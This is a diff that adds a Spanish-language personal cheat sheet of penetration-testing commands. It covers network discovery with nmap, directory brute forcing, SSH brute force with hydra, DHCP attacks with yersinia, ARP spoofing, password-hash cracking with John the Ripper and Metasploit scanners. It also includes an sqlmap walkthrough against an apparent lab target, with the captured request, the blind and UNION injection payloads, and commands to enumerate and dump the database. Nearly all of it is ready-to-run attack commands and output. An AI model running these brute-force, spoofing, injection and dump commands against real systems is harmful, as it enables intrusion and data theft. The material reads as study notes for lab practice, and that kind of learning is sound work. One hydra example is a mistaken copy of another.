@@ -1,0 +1,339 @@
+***************
+smblciente
+****************
+smbclient //w2003/tierramedia -U elrond
+
+*****
+dirb
+*******
+dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt
+
+***********
+gobuster
+**************
+gobuster dir -u http://10.10.104.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+
+********
+netview
+*********
+net view \\192.168.1.17 /All
+net use
+
+*******
+nmap
+*********
+decubrimiento por ARP
+
+nmap -sn -PR 192.168.1.0/24
+
+nmap -sn -PU 192.168.1.254 <= escaneo por UDP
+nmap -sn -PE 192.168.1.0/24 <= descubrimiento por ICMP de equpos vivos
+
+
+escaneo con nmap 
+
+nmap -Pn -sS -A -oX test 192.168.1.0/24
+
+script para descubrir sistema operativo
+
+nmap --script smb-os-discovery.nse 192.168.1.74
+nmap -sS <= stealth scan para bypass fw (half-open)
+nmap -sX identifica si el fow está habilitado
+nmap -sM identifica si el fw está habilitado
+nmap -sA Indica si el fw está habilitado (puertos filtrados)
+
+
+*********
+hydra
+**********
+ssh
+hydra -l <username> -P <full path to pass> 10.10.182.54 -t 4 ssh
+
+ftp
+hydra -l <username> -P <full path to pass> 10.10.182.54 -t 4 ssh
+
+
+******
+yessinia
+********
+
+
+yersinia -G  <= gráfico
+yersinia -I  <= interactivo
+  opción “q”   <= salir de la pantalla
+  opción “F2" <= seleccionar opción DHCP
+   opción “x” <=lista disponible de ataques
+   opción “2” <= seleccioanar opción de Discover y se ejecuta el ataque"
+  opción "detener ataque y salir de la herramienta
+  
+ 
+******
+arpspool
+**********
+#arpspoof -i eth0 -t  <víctima> -r <Router>
+
+
+*******
+Nikto
+*********
+
+nikto -H  -Tuning x
+nikto -h www.certifiedhacker.com -Cgidirs all
+
+
+**********
+john the rippoer
+**********
+
+john the rippoer
+
+sudo apt install john 
+
+https://shamsher-khan-404.medium.com/john-the-ripper-tryhackme-writeup-df934dec3a97 <= link de referencia
+
+sudo apt install hash-identifier
+hash-identifier 2e67..........................
+
+wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
+python3 hash-id.py
+
+tar xvzf rockyou.txt.tar.gz
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+
+john --format=[format] --wordlist=[path to wordlist] [path to file]
+john --list=formats  <= lista todos los formatos
+john --list=formats | grep -iF "md5"
+
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+john --format=whirlpool --wordlist=/home/cyber/Documents/rockyou.txt hash4.txt
+john --format=nt --wordlist=/home/cyber/Documents/rockyou.txt  ntlm.txt     <= Formato de hashes Windows
+ 
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt  <= crack una llave
+ 
+Cracking Hashes from /etc/shadow
+
+john --wordlist=passwords.lst password.txt
+john --show password.txt
+
+****
+sqlmap
+******
+
+sqlmap -u https://testsite.com/page.php?id=7 --dbs
+
+-u <= la utl vulnerable
+--dbs <= enumera la bawe de datos
+
+
+ejemplo de captura con vulnerabilidad
+
+nare@nare$ cat req.txt
+POST /blood/nl-search.php HTTP/1.1
+Host: 10.10.17.116
+Content-Length: 16
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.17.116
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.17.116/blood/nl-search.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
+Connection: close
+
+blood_group=B%2B <= parámetro de vulnerabildiad
+
+
+sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+sqlmap -r req.txt -p blood_group --dbs
+
+Método basado en GET
+sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
+ 
+ 
+ Método basado en POST
+ 
+sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
+sqlmap -r req.txt -p blood_group -D blood --tables
+ 
+nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables
+[19:35:57] [INFO] parsing HTTP request from 'req.txt'
+[19:35:57] [INFO] resuming back-end DBMS 'mysql'
+[19:35:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
+---
+[19:35:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[19:35:58] [INFO] fetching tables for database: 'blood'
+[19:35:58] [WARNING] reflective value(s) found and filtering out
+Database: blood
+[3 tables]
++----------+
+| blood_db |
+| flag     |
+| users    |
++----------+
+        
+
+Una vez identificdas las tablas, ahora se obtienen las columans de la tabla
+
+Método basado en GET 
+
+sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
+
+Método basado en POST 
+
+sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+sqlmap -r req.txt -D blood -T blood_db --columns
+ nare@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
+[19:35:57] [INFO] parsing HTTP request from 'req.txt'
+[19:35:57] [INFO] resuming back-end DBMS 'mysql'
+[19:35:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
+---
+[19:35:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[19:35:58] [INFO] fetching tables for database: 'blood'
+[19:35:58] [WARNING] reflective value(s) found and filtering out
+Database: blood
+[3 tables]
++----------+
+| blood_db |
+| flag     |
+| users    |
++----------+
+       
+volcar todas las bases de datos y tablas disponibles utilizando los siguientes comandos.
+
+Método basado en GET
+
+sqlmap -u https://testsite.com/page.php?id=7 -D  <database_name> --dump-all
+
+sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
+
+Método basado en POST
+
+sqlmap -r req.txt -D <database_name>  --dump-all
+
+sqlmap -r req.txt-p  -D <database_name> --dump-all
+
+
+
+**********
+metaesploit
+***********
+
+arrancar base de datos metasploit
+
+#service postgresql start
+
+
+dentro de metaesploit
+
+>db_status
+
+salir de metaesploit e iniciar la base de datos
+
+#msfdb init
+
+reiniciar servicio de postgresql
+
+#service postgresql restart
+
+cargar archivo de nmap
+
+>db_import  test
+
+
+ver host importados
+
+>hosts
+
+ver servicios importados
+
+>services
+o
+db_services
+
+
+*************
+Módulo Portscan
+*************
+
+
+
+>search portscan
+>use auxiliary/scanner/portscan/syn
+
+set INTERFACE  ens33
+set PORTS 80
+set RHOSTS 192.168.1.60-80
+set THREADS 50
+
+run
+
+Muestra las direcciones ip con el servicio del puerto 80, sobre un rango de direcciones ip
+
+
+>use auxiliary/scanner/portscan/tcp
+
+muestra la carga de host a través de nmap, carga esta lista en las opciones del módulo
+
+>hosts -R
+
+>options
+>run
+
+
+
+link de ayuda
+https://www.hackbysecurity.com/blog/metasploit-cheat-sheet-1
+
+Muestra la versión del smb, para identificar lose servidores corriendo el smb y versión
+
+>use auxiliary/scanner/smb/smb_version
+>set RHOSTS 192.168.1.50-192.168.1.80
+>set THREADS 11
+>run
+
+Muestra las versión de ftp, permite identificar los servidores corriendo el ftp  y versión
+
+>use auxiliary/scanner/ftp/ftp_version
+>set RHOSTS 192.168.1.50-192.168.1.80
+>set THREADS 11
+>run
+
+exportar información de los hosts
+
+>back
+>hosts -o /root/Desktop/Mataesploit_Scan_Results.csv
+
